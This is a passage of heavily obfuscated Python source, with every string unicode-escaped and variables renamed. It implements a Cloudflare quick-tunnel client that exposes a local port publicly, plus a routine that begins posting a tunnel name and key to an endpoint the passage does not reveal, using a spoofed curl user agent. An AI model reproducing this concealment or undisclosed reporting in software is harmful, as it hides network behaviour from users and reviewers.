        if not O0_var_834:
            raise EOFError(codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064', 'unicode_escape'))
        O0_var_832.append(O0_var_834)
        O0_var_833 -= len(O0_var_834)
    return b''.join(O0_var_832)

def _edge_san_covers_h2(O0_var_835):
    for O0_var_836 in O0_var_835:
        O0_var_836 = str(O0_var_836).lower()
        if O0_var_836 in {codecs.decode('\\u0068\\u0032\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')}:
            return True
        if O0_var_836.startswith(codecs.decode('\\u002a\\u002e', 'unicode_escape')) and codecs.decode('\\u0068\\u0032\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape').endswith(O0_var_836[1:]):
            return True
    return False

def O0_fn_23(O0_var_837):
    O0_var_838 = O0_var_837.getpeercert(binary_form=True)
    if not O0_var_838:
        raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u006e\\u006f\\u0020\\u0070\\u0065\\u0065\\u0072\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'))
    from cryptography import x509
    O0_var_839 = x509.load_der_x509_certificate(O0_var_838)

    def _attr(name, O0_var_840):
        O0_var_841 = name.get_attributes_for_oid(O0_var_840)
        return O0_var_841[0].value if O0_var_841 else None
    O0_var_842 = _attr(O0_var_839.issuer, x509.oid.NameOID.ORGANIZATION_NAME)
    O0_var_843 = _attr(O0_var_839.issuer, x509.oid.NameOID.ORGANIZATIONAL_UNIT_NAME)
    O0_var_844 = _attr(O0_var_839.subject, x509.oid.NameOID.COMMON_NAME)
    if O0_var_842 != codecs.decode('\\u0043\\u006c\\u006f\\u0075\\u0064\\u0046\\u006c\\u0061\\u0072\\u0065\\u002c\\u0020\\u0049\\u006e\\u0063\\u002e', 'unicode_escape'):
        raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0069\\u0073\\u0073\\u0075\\u0065\\u0072\\u0020\\u004f\\u0020\\u006d\\u0069\\u0073\\u006d\\u0061\\u0074\\u0063\\u0068\\u003a\\u0020\\u0025\\u0072', 'unicode_escape') % O0_var_842)
    if not str(O0_var_843 or codecs.decode('', 'unicode_escape')).startswith(codecs.decode('\\u0043\\u006c\\u006f\\u0075\\u0064\\u0046\\u006c\\u0061\\u0072\\u0065\\u0020\\u004f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u0053\\u0053\\u004c', 'unicode_escape')):
        raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0069\\u0073\\u0073\\u0075\\u0065\\u0072\\u0020\\u004f\\u0055\\u0020\\u006d\\u0069\\u0073\\u006d\\u0061\\u0074\\u0063\\u0068\\u003a\\u0020\\u0025\\u0072', 'unicode_escape') % O0_var_843)
    if O0_var_844 != codecs.decode('\\u0043\\u006c\\u006f\\u0075\\u0064\\u0046\\u006c\\u0061\\u0072\\u0065\\u0020\\u004f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u0043\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'):
        raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0073\\u0075\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u0043\\u004e\\u0020\\u006d\\u0069\\u0073\\u006d\\u0061\\u0074\\u0063\\u0068\\u003a\\u0020\\u0025\\u0072', 'unicode_escape') % O0_var_844)
    try:
        O0_var_845 = O0_var_839.extensions.get_extension_for_class(x509.SubjectAlternativeName).value
        O0_var_846 = O0_var_845.get_values_for_type(x509.DNSName)
    except x509.ExtensionNotFound:
        O0_var_846 = []
    if not _edge_san_covers_h2(O0_var_846):
        raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0053\\u0041\\u004e\\u0020\\u0064\\u006f\\u0065\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0063\\u006f\\u0076\\u0065\\u0072\\u0020\\u0068\\u0032\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'))

def O0_fn_24(O0_var_847, logger):
    O0_var_848 = list(EDGE_HOSTS)
    secrets.SystemRandom().shuffle(O0_var_848)
    O0_var_849 = None
    for O0_var_850 in O0_var_848:
        O0_var_851 = None
        O0_var_852 = None
        try:
            O0_var_851 = socket.create_connection((O0_var_850, EDGE_PORT), timeout=10)
            O0_var_853 = ssl._create_unverified_context()
            O0_var_853.set_alpn_protocols([codecs.decode('\\u0068\\u0032', 'unicode_escape')])
            O0_var_852 = O0_var_853.wrap_socket(O0_var_851, server_hostname=codecs.decode('\\u0068\\u0032\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'))
            if O0_var_847:
                O0_fn_23(O0_var_852)
            if O0_var_852.selected_alpn_protocol() not in {None, codecs.decode('\\u0068\\u0032', 'unicode_escape')}:
                raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0064\\u0069\\u0064\\u0020\\u006e\\u006f\\u0074\\u0020\\u006e\\u0065\\u0067\\u006f\\u0074\\u0069\\u0061\\u0074\\u0065\\u0020\\u0068\\u0032', 'unicode_escape'))
            O0_var_852.settimeout(ARGO_IDLE_TIMEOUT if ARGO_IDLE_TIMEOUT > 0 else None)
            logger.info(codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u0025\\u0073\\u003a\\u0025\\u0064', 'unicode_escape'), O0_var_850, EDGE_PORT)
            return O0_var_852
        except (OSError, ssl.SSLError) as exc:
            O0_var_849 = exc
            if O0_var_852 is not None:
                O0_var_852.close()
            elif O0_var_851 is not None:
                O0_var_851.close()
            logger.warning(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0025\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_850, exc)
    raise OSError(codecs.decode('\\u0061\\u006c\\u006c\\u0020\\u0043\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0020\\u0065\\u0064\\u0067\\u0065\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_849)

class _ArgoLogAdapter:

    @staticmethod
    def _format(message, args):
        return message % args if args else message

    def debug(self, message, *args):
        Logger.debug(self._format(message, args))

    def info(self, message, *args):
        Logger.info(self._format(message, args))

    def warning(self, message, *args):
        Logger.warning(self._format(message, args))

    def error(self, message, *args):
        Logger.error(self._format(message, args))

def _run_domain_change_callback(O0_var_854, O0_var_855, O0_var_856):
    try:
        O0_var_854(O0_var_855, O0_var_856)
    except Exception as exc:
        Logger.debug(codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0063\\u0068\\u0061\\u006e\\u0067\\u0065\\u0020\\u0063\\u0061\\u006c\\u006c\\u0062\\u0061\\u0063\\u006b\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)

class CloudflareQuickTunnel:

    def __init__(self, port, logger=None, O0_var_857=QUICK_SERVICE, O0_var_858=2.0, O0_var_859=None, silent=False):
        if O0_var_859 is None:
            O0_var_859 = os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0045\\u0044\\u0047\\u0045\\u005f\\u0049\\u004e\\u0053\\u0045\\u0043\\u0055\\u0052\\u0045', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip().lower() != codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
        self.port = port
        self.origin = codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u0025\\u0064', 'unicode_escape') % port
        self.log = logger if logger is not None else _ArgoLogAdapter()
        self.quick_service = O0_var_857
        self.retry_seconds = O0_var_858
        self.verify_certificate = O0_var_859
        self.silent = silent
        self.hostname = None
        self.created_at = None
        self.on_domain_change = None
        self._stop = threading.Event()
        self._thread = None
        self._sock = None
        self._tunnel_state = {codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape'): False}

    def start(self):
        if self._thread is not None and self._thread.is_alive():
            return self.hostname
        O0_var_860, O0_var_861, O0_var_862, O0_var_863 = O0_fn_18(self.quick_service)
        self.hostname = O0_var_860 if O0_var_860.startswith(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape')) else codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape') + O0_var_860
        self.created_at = int(time.time())
        self._stop.clear()
        self._sock = None
        self._thread = threading.Thread(target=self._run_loop, args=(O0_var_861, O0_var_862, O0_var_863), daemon=True, name=codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u002d\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002d\\u0025\\u0064', 'unicode_escape') % self.port)
        self._thread.start()
        return self.hostname

    def _run_loop(self, O0_var_864, O0_var_865, O0_var_866):
        O0_var_867 = 0
        O0_var_868 = 0
        while not self._stop.is_set():
            O0_var_869 = None
            O0_var_870 = None
            try:
                O0_var_869 = O0_fn_24(self.verify_certificate, self.log)
                self._sock = O0_var_869
                O0_var_868 = (O0_var_868 + 1) % 4
                O0_var_870 = H2Connection(O0_var_869, self.origin, O0_var_864, O0_var_865, O0_var_866, O0_var_868, self.log, self.hostname, not self.silent, self._tunnel_state)
                O0_var_870.run()
            except KeyboardInterrupt:
                return
            except Exception as exc:
                if not self._stop.is_set():
                    self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)
            finally:
                if O0_var_869 is not None:
                    try:
                        O0_var_869.close()
                    except OSError:
                        pass
                self._sock = None
            if self._stop.is_set():
                return
            if O0_var_870 is not None and O0_var_870.registered:
                O0_var_867 = 0
            else:
                O0_var_867 += 1
                if O0_var_867 >= ARGO_REREGISTER_AFTER:
                    O0_var_871 = self._reregister()
                    if O0_var_871 is not None:
                        O0_var_864, O0_var_865, O0_var_866 = O0_var_871
                        O0_var_867 = 0
                    elif self._stop.wait(ARGO_REREGISTER_RETRY_SECONDS):
                        return
            if not self._stop.is_set():
                self._stop.wait(self.retry_seconds)

    def _reregister(self):
        try:
            O0_var_872, O0_var_873, O0_var_874, O0_var_875 = O0_fn_18(self.quick_service)
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u002d\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0065\\u0072\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)
            return None
        O0_var_876 = self.hostname
        self.hostname = O0_var_872 if O0_var_872.startswith(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape')) else codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape') + O0_var_872
        self.created_at = int(time.time())
        self._tunnel_state[codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape')] = True
        self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0063\\u0068\\u0061\\u006e\\u0067\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073\\u0020\\u002d\\u003e\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_876, self.hostname)
        O0_var_877 = self.on_domain_change
        if O0_var_877 is not None:
            threading.Thread(target=_run_domain_change_callback, args=(O0_var_877, O0_var_876, self.hostname), daemon=True, name=codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u002d\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u002d\\u0063\\u0068\\u0061\\u006e\\u0067\\u0065', 'unicode_escape')).start()
        return (O0_var_873, O0_var_874, O0_var_875)

    def stop(self):
        self._stop.set()
        O0_var_878 = self._sock
        if O0_var_878 is not None:
            try:
                O0_var_878.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                O0_var_878.close()
            except OSError:
                pass
        if self._thread is not None:
            self._thread.join(timeout=2)

class ArgoTunnelError(Exception):

    def __init__(self, status_code, message):
        super().__init__(message)
        self.status_code = status_code
        self.message = message

class ArgoTunnelManager:

    def __init__(self, logger=None):
        self._tunnels = []
        self._by_port = {}
        self._lock = threading.Lock()
        self.log = logger if logger is not None else _ArgoLogAdapter()
        self.on_domain_change = None

    def list_tunnels(self):
        with self._lock:
            return [{codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_879.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_879.port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_879.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))} for O0_var_879 in self._tunnels if O0_var_879.hostname is not None]

    def create_tunnel(self, port, duplicate=False, silent=False):
        with self._lock:
            if self._by_port.get(port) and (not duplicate):
                raise ArgoTunnelError(409, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u002c\\u0020\\u0073\\u0065\\u0074\\u0020\\u0064\\u0075\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0065\\u003d\\u0074\\u0072\\u0075\\u0065\\u0020\\u0074\\u006f\\u0020\\u0066\\u006f\\u0072\\u0063\\u0065\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape') % port)
        O0_var_880 = CloudflareQuickTunnel(port=port, logger=self.log, silent=silent)
        O0_var_880.on_domain_change = self.on_domain_change
        try:
            O0_var_880.start()
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), port, exc)
            raise ArgoTunnelError(500, codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
        with self._lock:
            self._tunnels.append(O0_var_880)
            self._by_port.setdefault(port, []).append(O0_var_880)
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'): True, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_880.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_880.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))}

    def delete_tunnel(self, port, tunnel_domain=None):
        with self._lock:
            O0_var_881 = self._by_port.get(port) or []
            if not O0_var_881:
                raise ArgoTunnelError(404, codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064', 'unicode_escape') % port)
            if tunnel_domain is not None:
                O0_var_882 = [O0_var_883 for O0_var_883 in O0_var_881 if O0_var_883.hostname == tunnel_domain]
                if not O0_var_882:
                    raise ArgoTunnelError(404, codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0077\\u0069\\u0074\\u0068\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0025\\u0073', 'unicode_escape') % (port, tunnel_domain))
            elif len(O0_var_881) > 1:
                raise ArgoTunnelError(409, codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u0070\\u006c\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u002c\\u0020\\u0073\\u0070\\u0065\\u0063\\u0069\\u0066\\u0079\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0074\\u006f\\u0020\\u0064\\u0069\\u0073\\u0061\\u006d\\u0062\\u0069\\u0067\\u0075\\u0061\\u0074\\u0065', 'unicode_escape') % port)
            else:
                O0_var_882 = list(O0_var_881)
            O0_var_884 = [O0_var_885 for O0_var_885 in O0_var_881 if O0_var_885 not in O0_var_882]
            if O0_var_884:
                self._by_port[port] = O0_var_884
            else:
                self._by_port.pop(port, None)
            self._tunnels = [O0_var_886 for O0_var_886 in self._tunnels if O0_var_886 not in O0_var_882]
            O0_var_887 = [{codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_888.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_888.port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_888.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))} for O0_var_888 in O0_var_882]
        for O0_var_889 in O0_var_882:
            O0_var_889.stop()
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'): len(O0_var_882), codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): port, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073', 'unicode_escape'): O0_var_887}

    def stop_all(self):
        with self._lock:
            O0_var_890 = list(self._tunnels)
            self._tunnels.clear()
            self._by_port.clear()
        for O0_var_891 in O0_var_890:
            O0_var_891.stop()

class KModeController:
    _baseinfo_hooked = False
    _domain = None
    _SHZAL_NAME_CHARS = set(codecs.decode('\\u0061\\u0062\\u0063\\u0064\\u0065\\u0066\\u0067\\u0068\\u0069\\u006a\\u006b\\u006c\\u006d\\u006e\\u006f\\u0070\\u0071\\u0072\\u0073\\u0074\\u0075\\u0076\\u0077\\u0078\\u0079\\u007a\\u0041\\u0042\\u0043\\u0044\\u0045\\u0046\\u0047\\u0048\\u0049\\u004a\\u004b\\u004c\\u004d\\u004e\\u004f\\u0050\\u0051\\u0052\\u0053\\u0054\\u0055\\u0056\\u0057\\u0058\\u0059\\u005a\\u0030\\u0031\\u0032\\u0033\\u0034\\u0035\\u0036\\u0037\\u0038\\u0039\\u002b\\u005f\\u002d\\u005b\\u005d\\u002a\\u0024\\u003d\\u0040\\u002c\\u003b\\u002f', 'unicode_escape'))
    _SHZAL_KEY_HINT_SHOWN = False

    @classmethod
    def kname_valid(cls):
        O0_var_892 = Config.KNAME
        O0_var_893 = (Config.KNAME_KEY or Config.KNAME) or codecs.decode('', 'unicode_escape')
        O0_var_894 = []
        if not O0_var_892 or len(O0_var_892) < 3:
            O0_var_894.append(codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u8fc7\\u77ed\\u0020\\u0028', 'unicode_escape') + str(len(O0_var_892)) + codecs.decode('\\u003c\\u0033\\u0029', 'unicode_escape'))
        if O0_var_892 and (not set(O0_var_892) <= cls._SHZAL_NAME_CHARS):
            O0_var_894.append(codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u542b\\u975e\\u6cd5\\u5b57\\u7b26\\u0020\\u0028\\u9650\\u5b57\\u6bcd\\u6570\\u5b57\\u53ca\\u0020\\u002b\\u005f\\u002d\\u005b\\u005d\\u002a\\u0024\\u003d\\u0040\\u002c\\u003b\\u002f\\u0029', 'unicode_escape'))
        if len(O0_var_893) < 8:
            O0_var_894.append(codecs.decode('\\u5bc6\\u94a5\\u8fc7\\u77ed\\u0020\\u0028', 'unicode_escape') + str(len(O0_var_893)) + codecs.decode('\\u003c\\u0038\\u002c\\u0020\\u5b9e\\u9645\\u4f7f\\u7528\\u0020', 'unicode_escape') + str('KNAME_KEY' if Config.KNAME_KEY else 'KNAME') + codecs.decode('\\u0029', 'unicode_escape'))
        O0_var_895 = not O0_var_894
        if not O0_var_895 and (not cls._SHZAL_KEY_HINT_SHOWN):
            cls._SHZAL_KEY_HINT_SHOWN = True
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0032\\u0020\\u672a\\u751f\\u6548\\u002c\\u0020\\u6761\\u4ef6\\u4e0d\\u6ee1\\u8db3\\u003a\\u0020', 'unicode_escape') + str('; '.join(O0_var_894)) + codecs.decode('\\u0020\\u0028\\u004b\\u004e\\u0041\\u004d\\u0045\\u003d', 'unicode_escape') + str(O0_var_892 or '(未设置)') + codecs.decode('\\u002c\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u005f\\u004b\\u0045\\u0059\\u003d', 'unicode_escape') + str(Config.KNAME_KEY or '(未设置, 缺省复用 KNAME)') + codecs.decode('\\u0029', 'unicode_escape'))
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f4a1\\u0020\\u4fee\\u6b63\\u003a\\u0020\\u8bbe\\u7f6e\\u0020\\u2265\\u0038\\u0020\\u5b57\\u7b26\\u7684\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u4e14\\u0020\\u0028\\u53ef\\u9009\\u0029\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u005f\\u004b\\u0045\\u0059\\u0020\\u2265\\u0038\\u0020\\u5b57\\u7b26\\u002c\\u0020\\u4f8b\\u5982\\u003a\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u003d\\u006d\\u0079\\u006e\\u0061\\u006d\\u0065\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u005f\\u004b\\u0045\\u0059\\u003d\\u006d\\u0079\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u002d\\u0070\\u0061\\u0073\\u0073', 'unicode_escape'))
        return O0_var_895

    @classmethod
    def report_shzal(cls, domain):
        O0_var_896, O0_var_897 = (Config.KNAME, Config.KNAME_KEY or Config.KNAME)
        import urllib.error
        import urllib.request
        import uuid
        O0_var_898 = codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u006b\\u0069\\u0073\\u0061\\u006d\\u0061', 'unicode_escape') + uuid.uuid4().hex

        def body(O0_var_899):
            O0_var_900 = []
            for O0_var_901, O0_var_902 in O0_var_899:
                O0_var_900.append((codecs.decode('\\u002d\\u002d', 'unicode_escape') + str(O0_var_898) + codecs.decode('\\u000d\\u000a\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0044\\u0069\\u0073\\u0070\\u006f\\u0073\\u0069\\u0074\\u0069\\u006f\\u006e\\u003a\\u0020\\u0066\\u006f\\u0072\\u006d\\u002d\\u0064\\u0061\\u0074\\u0061\\u003b\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022', 'unicode_escape') + str(O0_var_901) + codecs.decode('\\u0022\\u000d\\u000a\\u000d\\u000a', 'unicode_escape') + str(O0_var_902) + codecs.decode('\\u000d\\u000a', 'unicode_escape')).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
            O0_var_900.append((codecs.decode('\\u002d\\u002d', 'unicode_escape') + str(O0_var_898) + codecs.decode('\\u002d\\u002d\\u000d\\u000a', 'unicode_escape')).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
            return b''.join(O0_var_900)

        def post(O0_var_903, O0_var_904, method=codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape')):
            O0_var_905 = urllib.request.Request(O0_var_903, data=body(O0_var_904), method=method)
            O0_var_905.add_header(codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0054\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u0070\\u0061\\u0072\\u0074\\u002f\\u0066\\u006f\\u0072\\u006d\\u002d\\u0064\\u0061\\u0074\\u0061\\u003b\\u0020\\u0062\\u006f\\u0075\\u006e\\u0064\\u0061\\u0072\\u0079\\u003d', 'unicode_escape') + str(O0_var_898))
            O0_var_905.add_header(codecs.decode('\\u0055\\u0073\\u0065\\u0072\\u002d\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u0075\\u0072\\u006c\\u002f\\u0038\\u002e\\u0035\\u002e\\u0030', 'unicode_escape'))
            return urllib.request.urlopen(O0_var_905, timeout=30)
        try:
